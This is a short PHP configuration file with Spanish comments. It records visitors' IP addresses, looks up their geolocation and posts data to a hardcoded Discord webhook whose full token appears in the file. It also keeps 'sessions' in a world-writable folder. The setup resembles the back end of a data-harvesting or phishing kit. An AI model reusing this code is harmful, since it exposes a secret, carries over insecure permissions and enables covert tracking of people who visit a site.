<?php
// config.php - Configuración y funciones globales

// URL del Webhook de Discord
define('DISCORD_WEBHOOK_URL', 'https://discordapp.com/api/webhooks/1429890206827544680/MXyXzovSdiqk7m5Bysu9oxHx7n4dkTBN-hYB0rElLRIf6xQ3D3YZ8WCF-__diz7pcgTt');

// Directorio para guardar sesiones (asegúrate de que tenga permisos de escritura)
define('DATA_DIR', __DIR__ . '/data');

if (!file_exists(DATA_DIR)) {
    mkdir(DATA_DIR, 0777, true);
}

// Función para obtener la IP del cliente
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Función para obtener geolocalización básica
function getGeoLocation($ip) {
    $url = "http://ipinfo.io/{$ip}/json";
    $options = [
        'http' => [
            'method'  => 'GET',
            'timeout' => 3
        ]
    ];
    $context  = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    
    if ($response) {
        return json_decode($response, true);
    }
    return ['country' => 'Desconocido', 'city' => 'Desconocida'];
}

// Función para enviar a Discord
function sendToDiscord($content, $embeds = []) {
    $payload = json_encode([
        'content' => $content,
        'embeds' => $embeds
    ]);

    $options = [
        'http' => [
            'header'  => "Content-Type: application/json\r\n",
            'method'  => 'POST',
            'content' => $payload,
            'timeout' => 5
        ]
    ];
    $context  = stream_context_create($options);
    @file_get_contents(DISCORD_WEBHOOK_URL, false, $context);
}
